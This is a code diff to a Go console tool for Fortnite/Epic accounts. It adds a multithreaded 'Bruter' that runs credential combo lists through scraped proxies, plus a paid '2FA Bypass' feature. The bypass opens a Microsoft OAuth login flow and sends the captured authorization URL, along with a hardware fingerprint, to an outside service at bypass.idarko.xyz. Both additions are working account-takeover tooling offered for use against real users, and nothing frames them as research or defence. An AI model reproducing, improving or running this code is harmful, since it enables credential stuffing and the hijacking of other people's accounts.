@@ -19,10 +19,14 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
-"net/http" 
+	"net/http" 
 	"net/url"  
 	"github.com/go-ini/ini"
 	"github.com/hugolgst/rich-go/client"
+	"bytes"
+	"runtime"
+	"crypto/sha256"
+	"encoding/hex"
 )
 
 var (
@@ -31,7 +35,6 @@ var (
 	dashboardData    = map[string]interface{}{}
 	UseScrapedProxies bool
 	ScrapedProxies    []string
-	
 )
 
 func LoadConfig() bool {
@@ -787,11 +790,13 @@ func main() {
 		ClearConsole()
 		PrintLogo()
 		LogInfo("╔════════════════════════════════════════╗")
-		LogInfo("║              Main Menu                ║")
+		LogInfo("║              Main Menu                 ║")
 		LogInfo("╠════════════════════════════════════════╣")
-		LogInfo("║ [1] Run FN Checker                    ║")
-		LogInfo("║ [2] Sort Logs                         ║")
-		LogInfo("║ [0] Exit                              ║")
+		LogInfo("║ [1] Run FN Checker                     ║")
+		LogInfo("║ [2] Bruter                             ║")
+		LogInfo("║ [3] Sort Logs                          ║")
+	    LogInfo("║ [4] 2FA Bypass                         ║")
+		LogInfo("║ [0] Exit                               ║")
 		LogInfo("╚════════════════════════════════════════╝")
 		fmt.Print("\n [>] ")
 		choice, _ := reader.ReadString('\n')
@@ -894,8 +899,117 @@ func main() {
 			LogError("\nPress Enter to exit...")
 			reader.ReadString('\n')
 			return
-		case "2":
+case "2":
+    if ThreadCount <= 0 {
+        AskForThreads()
+    }
+    if ProxyType == "" {
+        AskForProxies()
+    }
+    LoadFiles()
+    AskForProxyScraping()
+    if UseProxies && !UseScrapedProxies {
+        Proxies, err := LoadProxies("proxies.txt")
+        if err != nil {
+            LogError("Failed to load proxies: " + err.Error())
+            Proxies = []string{}
+        } else {
+            LogInfo(fmt.Sprintf("Loaded [%d] proxies from proxies.txt!", len(Proxies)))
+        }
+    }
+    if !UseProxies && ProxylessMaxThreads > 0 && ThreadCount > ProxylessMaxThreads {
+        LogInfo(fmt.Sprintf("Proxyless mode detected - capping threads to %d to reduce rate-limit skips.", ProxylessMaxThreads))
+        ThreadCount = ProxylessMaxThreads
+    }
+    if len(Ccombos) == 0 {
+        LogError("No valid combos loaded. Please check combo.txt. Exiting.")
+        time.Sleep(3 * time.Second)
+        return
+    }
+    
+    Check = 0
+    Hits = 0
+    Bad = 0
+    Retries = 0
+    Cpm = 0
+    initialComboCount = len(Ccombos)
+    
+    ClearConsole()
+    PrintLogo()
+    LogInfo("Press any key to start bruteforcing!")
+    reader.ReadString('\n')
+    
+    var modules []func(string) bool
+    modules = append(modules, BruterCheck)
+    
+    CheckerRunning = true
+    Sw = time.Now()
+    
+    var titleWg sync.WaitGroup
+    titleWg.Add(1)
+    go UpdateBruterTitle(&titleWg)
+    
+    go func() {
+        for _, combo := range Ccombos {
+            Combos <- combo
+        }
+    }()
+    
+    WorkWg.Add(len(Ccombos))
+    var wg sync.WaitGroup
+    for i := 0; i < ThreadCount; i++ {
+        wg.Add(1)
+        go func(workerID int) {
+            defer wg.Done()
+            defer func() {
+                if r := recover(); r != nil {
+                    LogError(fmt.Sprintf("CRITICAL: Worker %d crashed with panic: %v", workerID, r))
+                    LogError(fmt.Sprintf("Worker %d recovery: Other workers continue running", workerID))
+                }
+            }()
+            for combo := range Combos {
+                if !CheckerRunning {
+                    return
+                }
+                for _, module := range modules {
+                    done := make(chan bool, 1)
+                    go func(combo string, module func(string) bool) {
+                        defer func() {
+                            if r := recover(); r != nil {
+                                LogError(fmt.Sprintf("Module panic recovered for combo %s: %v", combo, r))
+                            }
+                        }()
+                        module(combo)
+                        done <- true
+                    }(combo, module)
+                    select {
+                    case <-done:
+                    case <-time.After(45 * time.Second):
+                        LogError(fmt.Sprintf("TIMEOUT: Module for combo %s took longer than 45s", combo))
+                    }
+                }
+                WorkWg.Done()
+            }
+        }(i)
+    }
+    
+    WorkWg.Wait()
+    close(Combos)
+    wg.Wait()
+    CheckerRunning = false
+    titleWg.Wait()
+    
+    LogSuccess("\nAll bruteforcing completed!")
+    stats := fmt.Sprintf("Checked: %d | Bypassed: %d | Failed: %d | Retries: %d", Check, Hits, Bad, Retries)
+    fmt.Printf("%s[SUCCESS] %s%s\n", ColorGreen, centerText(stats, 80), ColorReset)
+    
+    LogInfo(fmt.Sprintf("\nResults saved to: %s", getBruterResultsFolder()))
+    LogError("\nPress Enter to continue...")
+    reader.ReadString('\n')
+		case "3":
 			SortLogs(reader)
+		case "4":
+			Handle2FABypass(reader)
 		case "0":
 			LogInfo("Exiting...")
 			return
@@ -1361,5 +1475,548 @@ func shutdownDiscordRPC() {
 		syscall.CloseHandle(discordIPC.pipe)
 		discordIPC = nil
 		LogInfo("Discord RPC disconnected")
+	}
+}
+
+func openBrowser(url string) error {
+	var cmd *exec.Cmd
+
+	switch runtime.GOOS {
+	case "windows":
+		cmd = exec.Command("rundll32", "url.dll,FileProtocolHandler", url)
+	case "darwin":
+		cmd = exec.Command("open", url)
+	default: // linux, freebsd, etc.
+		cmd = exec.Command("xdg-open", url)
+	}
+
+	return cmd.Start()
+}
+
+func Handle2FABypass(reader *bufio.Reader) {
+	for {
+		ClearConsole()
+		PrintLogo()
+		LogInfo("╔════════════════════════════════════════╗")
+		LogInfo("║           2FA Bypass Menu              ║")
+	    LogInfo("╠════════════════════════════════════════╣")
+		LogInfo("║ [1] Redeem Key / Use Premium Bypass    ║")
+		LogInfo("║ [2] Trial (3 bypasses per day)         ║")
+		LogInfo("║ [0] Back                               ║")
+		LogInfo("╚════════════════════════════════════════╝")
+		fmt.Print("\n [>] ")
+		choice, _ := reader.ReadString('\n')
+		choice = strings.TrimSpace(choice)
+		switch choice {
+		case "1":
+			RedeemKey(reader)
+		case "2":
+			TrialBypass(reader)
+		case "0":
+			return
+		default:
+			LogWarning("Invalid choice, please try again.")
+			time.Sleep(1 * time.Second)
+		}
+	}
+}
+
+type HardwareFingerprint struct {
+	UUID           string `json:"uuid"`
+	CPUInfo        string `json:"cpu"`
+	MACAddress     string `json:"mac"`
+	DiskSerial     string `json:"disk"`
+	BIOSSerial     string `json:"bios"`
+	MotherboardID  string `json:"motherboard"`
+	FingerprintHash string `json:"hash"`
+}
+
+type ClientProof struct {
+	Timestamp      int64  `json:"timestamp"`
+	Challenge      string `json:"challenge"`
+	ChallengeProof string `json:"challengeProof"`
+	ClientVersion  string `json:"version"`
+}
+
+const CLIENT_VERSION = "1.0.0"
+
+func GetHardwareFingerprint() HardwareFingerprint {
+	fp := HardwareFingerprint{}
+
+	out, _ := exec.Command("wmic", "csproduct", "get", "UUID").Output()
+	fp.UUID = strings.TrimSpace(strings.ReplaceAll(string(out), "UUID", ""))
+
+	out, _ = exec.Command("wmic", "cpu", "get", "ProcessorId").Output()
+	fp.CPUInfo = strings.TrimSpace(strings.ReplaceAll(string(out), "ProcessorId", ""))
+
+	out, _ = exec.Command("getmac", "/fo", "csv", "/nh").Output()
+	lines := strings.Split(string(out), "\n")
+	if len(lines) > 0 {
+		parts := strings.Split(lines[0], ",")
+		if len(parts) > 0 {
+			fp.MACAddress = strings.Trim(parts[0], "\"")
+		}
+	}
+
+	out, _ = exec.Command("wmic", "diskdrive", "get", "SerialNumber").Output()
+	fp.DiskSerial = strings.TrimSpace(strings.ReplaceAll(string(out), "SerialNumber", ""))
+
+	out, _ = exec.Command("wmic", "bios", "get", "SerialNumber").Output()
+	fp.BIOSSerial = strings.TrimSpace(strings.ReplaceAll(string(out), "SerialNumber", ""))
+
+	out, _ = exec.Command("wmic", "baseboard", "get", "SerialNumber").Output()
+	fp.MotherboardID = strings.TrimSpace(strings.ReplaceAll(string(out), "SerialNumber", ""))
+
+	composite := fmt.Sprintf("%s|%s|%s|%s|%s|%s",
+		fp.UUID, fp.CPUInfo, fp.MACAddress,
+		fp.DiskSerial, fp.BIOSSerial, fp.MotherboardID)
+	
+	h := sha256.Sum256([]byte(composite))
+	fp.FingerprintHash = hex.EncodeToString(h[:])
+
+	return fp
+}
+
+func RequestChallenge(fp HardwareFingerprint) (string, error) {
+	payload := map[string]interface{}{
+		"fingerprint": fp,
+		"timestamp":   time.Now().Unix(),
+	}
+	
+	jsBody, err := json.Marshal(payload)
+	if err != nil {
+		return "", fmt.Errorf("JSON marshal failed: %v", err)
+	}
+
+	resp, err := http.Post(
+		"https://bypass.idarko.xyz/challenge",
+		"application/json",
+		bytes.NewBuffer(jsBody),
+	)
+	if err != nil {
+		return "", fmt.Errorf("request failed: %v", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != 200 {
+		body, _ := ioutil.ReadAll(resp.Body)
+		return "", fmt.Errorf("server error (%d): %s", resp.StatusCode, string(body))
+	}
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return "", fmt.Errorf("failed to read response: %v", err)
+	}
+
+	var result map[string]interface{}
+	if err := json.Unmarshal(body, &result); err != nil {
+		return "", fmt.Errorf("failed to parse response: %v", err)
+	}
+
+	challenge, ok := result["challenge"].(string)
+	if !ok || challenge == "" {
+		return "", fmt.Errorf("no challenge in response")
+	}
+
+	return challenge, nil
+}
+
+func SolveChallenge(challenge string, difficulty int) string {
+	nonce := 0
+	
+	for {
+		attempt := fmt.Sprintf("%s:%d", challenge, nonce)
+		hash := sha256.Sum256([]byte(attempt))
+		hashStr := hex.EncodeToString(hash[:])
+		
+		if strings.HasPrefix(hashStr, strings.Repeat("0", difficulty)) {
+			return fmt.Sprintf("%d", nonce)
+		}
+		nonce++
+		
+	}
+}
+
+func GenerateClientProof(challenge string) ClientProof {
+	nonce := SolveChallenge(challenge, 4) 
+	
+	proof := ClientProof{
+		Timestamp:      time.Now().Unix(),
+		Challenge:      challenge,
+		ChallengeProof: nonce,
+		ClientVersion:  CLIENT_VERSION,
+	}
+	
+	
+	return proof
+}
+
+func RedeemKey(reader *bufio.Reader) {
+	keyFile := "bypass_key.txt"
+	savedKey, err := ioutil.ReadFile(keyFile)
+	
+	if err == nil && len(savedKey) > 0 {
+		LogInfo("Using saved key...")
+		PerformBypass(reader, string(savedKey))
+		return
+	}
+
+	ClearConsole()
+	PrintLogo()
+	LogInfo("Enter your key:")
+	fmt.Print("[>] ")
+
+	key, _ := reader.ReadString('\n')
+	key = strings.TrimSpace(key)
+
+	if len(key) < 5 {
+		LogError("Key is too short. Please enter a valid key.")
+		time.Sleep(2 * time.Second)
+		return
+	}
+
+	LogInfo("Collecting hardware fingerprint...")
+	fp := GetHardwareFingerprint()
+
+	LogInfo("Requesting authentication challenge...")
+	challenge, err := RequestChallenge(fp)
+	if err != nil {
+		LogError("Failed to request challenge: " + err.Error())
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+		return
+	}
+
+	LogInfo("Solving challenge (this may take a few seconds)...")
+	proof := GenerateClientProof(challenge)
+
+	LogInfo("Verifying key...")
+	payload := map[string]interface{}{
+		"key":         key,
+		"fingerprint": fp,
+		"proof":       proof,
+		"clientInfo": map[string]string{
+			"os":      runtime.GOOS,
+			"arch":    runtime.GOARCH,
+			"version": CLIENT_VERSION,
+		},
+	}
+	jsBody, _ := json.Marshal(payload)
+
+	redeemResp, err := http.Post(
+		"https://bypass.idarko.xyz/redeem",
+		"application/json",
+		bytes.NewBuffer(jsBody),
+	)
+	if err != nil {
+		LogError("Failed to connect: " + err.Error())
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+		return
+	}
+	defer redeemResp.Body.Close()
+
+	var result map[string]interface{}
+	json.NewDecoder(redeemResp.Body).Decode(&result)
+
+	if result["status"] == "redeemed" {
+		ioutil.WriteFile(keyFile, []byte(key), 0644)
+		LogSuccess("✓ Key redeemed successfully!")
+		LogInfo("Your key has been activated.")
+		time.Sleep(2 * time.Second)
+		PerformBypass(reader, key)
+	} else if result["error"] != nil {
+		errorMsg := result["error"].(string)
+		LogError(errorMsg)
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+	}
+}
+
+func TrialBypass(reader *bufio.Reader) {
+	LogInfo("Starting trial authentication...")
+	
+	fp := GetHardwareFingerprint()
+	
+	challenge, err := RequestChallenge(fp)
+	if err != nil {
+		LogError("Failed to request challenge: " + err.Error())
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+		return
+	}
+
+	LogInfo("Verifying eligibility...")
+	proof := GenerateClientProof(challenge)
+	
+
+	payload := map[string]interface{}{
+		"fingerprint": fp,
+		"proof":       proof,
+		"type":        "trial_request",
+	}
+		
+	jsBody, err := json.Marshal(payload)
+	if err != nil {
+		LogError("Failed to create request: " + err.Error())
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+		return
+	}
+
+	resp, err := http.Post(
+		"https://bypass.idarko.xyz/trial_init",
+		"application/json",
+		bytes.NewBuffer(jsBody),
+	)
+	if err != nil {
+		LogError("Request failed: " + err.Error())
+		LogInfo("Is the backend server running?")
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != 200 {
+		body, _ := ioutil.ReadAll(resp.Body)
+		
+		LogError(fmt.Sprintf("Server returned error (%d)", resp.StatusCode))
+		
+		var errResult map[string]interface{}
+		if json.Unmarshal(body, &errResult) == nil {
+			if errMsg, ok := errResult["error"].(string); ok {
+				LogError("Error: " + errMsg)
+				if msg, ok := errResult["message"].(string); ok {
+					LogInfo(msg)
+				}
+			}
+		} else {
+			LogError("Response: " + string(body))
+		}
+		
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+		return
+	}
+
+	var result map[string]interface{}
+	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+		LogError("Failed to parse response: " + err.Error())
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+		return
+	}
+
+	if result["status"] != "eligible" {
+		if isPremium, ok := result["isPremium"].(bool); ok && isPremium {
+			LogError("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+			LogError("   🌟 PREMIUM USER DETECTED 🌟")
+			LogError("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+			fmt.Println()
+			LogInfo("You already have a premium key activated!")
+			LogInfo("Please use the 'Redeem Key' option instead.")
+			LogInfo("Trial mode is not available for premium users.")
+			fmt.Println()
+			LogError("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+			LogInfo("Press Enter to go back...")
+			reader.ReadString('\n')
+			return
+		}
+
+		if errText, ok := result["error"].(string); ok {
+			if errText == "daily limit reached" || errText == "Daily trial limit reached" {
+				LogError("⚠️  Daily trial limit reached!")
+				LogInfo("You've used all your free trials for today.")
+				LogInfo("Get a premium key for unlimited access!")
+				LogInfo("Press Enter to go back...")
+				reader.ReadString('\n')
+				return
+			} else if errText == "IP trial limit reached" {
+				LogError("⚠️  IP trial limit reached!")
+				LogInfo("This network has used all free trials for today.")
+				LogInfo("Get a premium key for unlimited access!")
+				LogInfo("Press Enter to go back...")
+				reader.ReadString('\n')
+				return
+			} else {
+				LogError("Error: " + errText)
+			}
+		}
+
+		errorMsg := "Trial not available"
+		if errText, ok := result["error"].(string); ok && errText != "" {
+			errorMsg = errText
+		} else if msg, ok := result["message"].(string); ok && msg != "" {
+			LogInfo(msg)
+		}
+		
+		if errorMsg != "" {
+			LogError(errorMsg)
+		}
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+		return
+	}
+
+	sessionToken := result["session"].(string)
+	
+	if remaining, ok := result["trialsRemaining"].(float64); ok {
+		LogInfo(fmt.Sprintf("Trials remaining today: %d", int(remaining)))
+	}
+
+	LogInfo("A tab will open shortly. Please wait while it redirects you to the Epic Games page, then copy the URL and paste it here.")
+	time.Sleep(2 * time.Second)
+	
+	
+	url := "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&scope=xboxlive.signin&response_type=code&display=popup"
+	openBrowser(url)
+
+
+	ClearConsole()
+	PrintLogo()
+	LogInfo("Enter the URL:")
+	fmt.Print("[>] ")
+
+	inputURL, _ := reader.ReadString('\n')
+	inputURL = strings.TrimSpace(inputURL)
+
+	LogInfo("Processing your request...")
+
+	payload = map[string]interface{}{
+		"fingerprint": fp,
+		"session":     sessionToken,
+		"url":         inputURL,
+		"proof":       GenerateClientProof(challenge),
+	}
+	jsBody, _ = json.Marshal(payload)
+
+	resp, err = http.Post(
+		"https://bypass.idarko.xyz/trial_process",
+		"application/json",
+		bytes.NewBuffer(jsBody),
+	)
+	if err != nil {
+		LogError("Processing failed: " + err.Error())
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+		return
+	}
+	defer resp.Body.Close()
+
+	json.NewDecoder(resp.Body).Decode(&result)
+
+	if result["status"] == "ok" {
+		finalURL := result["resultUrl"].(string)
+			openBrowser(finalURL)
+		
+		LogSuccess("✓ Trial bypass successful!")
+		
+		if remaining, ok := result["trialsRemaining"].(float64); ok {
+			LogInfo(fmt.Sprintf("Trials remaining today: %d", int(remaining)))
+		}
+		
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+	} else {
+		errorMsg := "Trial failed"
+		if errText, ok := result["error"].(string); ok {
+			errorMsg = errText
+		}
+		LogError(errorMsg)
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+	}
+}
+
+
+
+func PerformBypass(reader *bufio.Reader, key string) {
+	LogInfo("A tab will open shortly. Please wait while it redirects you to the Epic Games page, then copy the URL and paste it here.")
+	time.Sleep(2 * time.Second)
+	
+	url := "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&scope=xboxlive.signin&response_type=code&display=popup"
+	openBrowser(url)
+	
+	ClearConsole()
+	PrintLogo()
+	LogInfo("Enter the URL:")
+	fmt.Print("[>] ")
+
+	inputURL, _ := reader.ReadString('\n')
+	inputURL = strings.TrimSpace(inputURL)
+
+	LogInfo("Processing your request...")
+
+	fp := GetHardwareFingerprint()
+	challenge, err := RequestChallenge(fp)
+	if err != nil {
+		LogError("Failed to request challenge: " + err.Error())
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+		return
+	}
+
+	proof := GenerateClientProof(challenge)
+
+	payload := map[string]interface{}{
+		"key":         key,
+		"fingerprint": fp,
+		"url":         inputURL,
+		"proof":       proof,
+	}
+	jsBody, _ := json.Marshal(payload)
+
+	resp, err := http.Post(
+		"https://bypass.idarko.xyz/process",
+		"application/json",
+		bytes.NewBuffer(jsBody),
+	)
+	if err != nil {
+		LogError("Failed to process: " + err.Error())
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+		return
+	}
+	defer resp.Body.Close()
+
+	var result map[string]interface{}
+	json.NewDecoder(resp.Body).Decode(&result)
+
+	if result["status"] == "ok" {
+		newURL := result["resultUrl"].(string)
+		exec.Command("cmd", "/c", "start", newURL).Run()
+		LogSuccess("✓ Bypass successful!")
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
+	} else {
+		errorMsg := "Bypass failed"
+		if errText, ok := result["error"].(string); ok {
+			errorMsg = errText
+			
+			switch errText {
+			case "Key not assigned to this hwid":
+				LogError("✗ Key verification failed.")
+				LogInfo("This key is not activated on this device.")
+			case "Invalid key":
+				LogError("✗ Your key is invalid or has been revoked.")
+			case "Key banned":
+				LogError("✗ Your key has been banned.")
+			case "Key expired":
+				LogError("✗ Your key has expired.")
+			case "Invalid code":
+				LogError("✗ The URL you provided is invalid or expired.")
+				LogInfo("Please try again with a fresh URL.")
+			case "Exchange failed: link expired or invalid":
+				LogError("✗ The authentication link has expired.")
+				LogInfo("Please generate a new link and try again.")
+			default:
+				LogError("✗ " + errorMsg)
+			}
+		} else {
+			LogError(errorMsg)
+		}
+		LogInfo("Press Enter to go back...")
+		reader.ReadString('\n')
 	}
 }
